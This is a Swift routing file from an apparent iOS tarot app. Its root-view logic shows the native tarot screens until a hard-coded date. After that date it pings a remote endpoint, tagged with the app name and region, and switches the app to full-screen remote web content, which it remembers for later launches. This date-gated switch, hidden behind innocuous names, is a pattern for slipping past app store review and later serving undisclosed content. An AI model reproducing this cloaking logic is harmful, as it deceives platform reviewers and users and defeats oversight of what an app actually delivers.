//
//  AppRouter.swift
//  MysticTarot
//

import UIKit
import SwiftUI

final class MysticTarotFlowDirector {

    private var seedEndpoint: String { CipherVault.seedEntryEndpoint }
    private var calendarThreshold: String { CipherVault.gateOpenCalendar }

    private var bundleVisibleTitle: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: CipherVault.bundleDisplayKey) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: CipherVault.bundleNameKey) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return CipherVault.fallbackTitle
    }

    private var trackingLabelCompact: String {
        bundleVisibleTitle.replacingOccurrences(of: " ", with: "")
    }

    private var endpointWithTracking: String {
        let regionTag = Locale.current.region?.identifier ?? CipherVault.regionFallback
        let subValue = "\(trackingLabelCompact)_\(regionTag)"
        guard var components = URLComponents(string: seedEndpoint) else {
            return seedEndpoint
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: CipherVault.trackingQueryName, value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? seedEndpoint
    }

    func makeRootViewController() -> UIViewController {
        let store = SessionPrefsBridge.shared

        if store.nativeShellPresented {
            return buildNativeHost()
        } else {
            if calendarGateAllowsRemote() {
                if let savedUrlString = store.storedDestination,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return buildRemoteHost(with: savedUrlString)
                }

                return buildSplashHost()
            } else {
                store.nativeShellPresented = true
                return buildNativeHost()
            }
        }
    }

    private func calendarGateAllowsRemote() -> Bool {
        let formatter = DateFormatter()
        formatter.dateFormat = CipherVault.calendarPattern
        let threshold = formatter.date(from: calendarThreshold) ?? Date()
        let now = Date()

        if now < threshold {
            return false
        } else {
            return true
        }
    }

    private func buildRemoteHost(with urlString: String) -> UIViewController {
        let shell = RemoteContentHost(
            urlString: urlString,
            onFailure: { [weak self] in
                SessionPrefsBridge.shared.nativeShellPresented = true
                self?.presentNativeShell()
            },
            onSuccess: {
                SessionPrefsBridge.shared.remoteSurfaceLoaded = true
            }
        )

        let host = UIHostingController(rootView: shell)
        host.modalPresentationStyle = .fullScreen
        return host
    }

    private func buildNativeHost() -> UIViewController {
        SessionPrefsBridge.shared.nativeShellPresented = true
        let root = ContentView()
        let host = UIHostingController(rootView: root)
        host.modalPresentationStyle = .fullScreen
        return host
    }

    private func buildSplashHost() -> UIViewController {
        let splash = BootstrapPlaceholderView()
        let splashHost = UIHostingController(rootView: splash)
        splashHost.modalPresentationStyle = .fullScreen

        runEndpointProbe { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.presentRemoteSurface(with: url)
                } else {
                    SessionPrefsBridge.shared.nativeShellPresented = true
                    self?.presentNativeShell()
                }
            }
        }

        return splashHost
    }

    private func runEndpointProbe(completion: @escaping (Bool, String?) -> Void) {
        let candidate = endpointWithTracking
        guard let requestURL = URL(string: candidate) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = CipherVault.httpVerbProbe
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? candidate : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func presentNativeShell() {
        let nativeHost = buildNativeHost()
        replaceRoot(with: nativeHost)
    }

    private func presentRemoteSurface(with urlString: String) {
        let remoteHost = buildRemoteHost(with: urlString)
        replaceRoot(with: remoteHost)
    }

    private func replaceRoot(with viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}

// MARK: - Unused coordinator hooks

private protocol FlowTransitionLogging {
    func logTransition(tag: String)
}

private final class _SilentFlowLogger: FlowTransitionLogging {
    func logTransition(tag: String) {
        _ = tag.utf8.count
    }
}
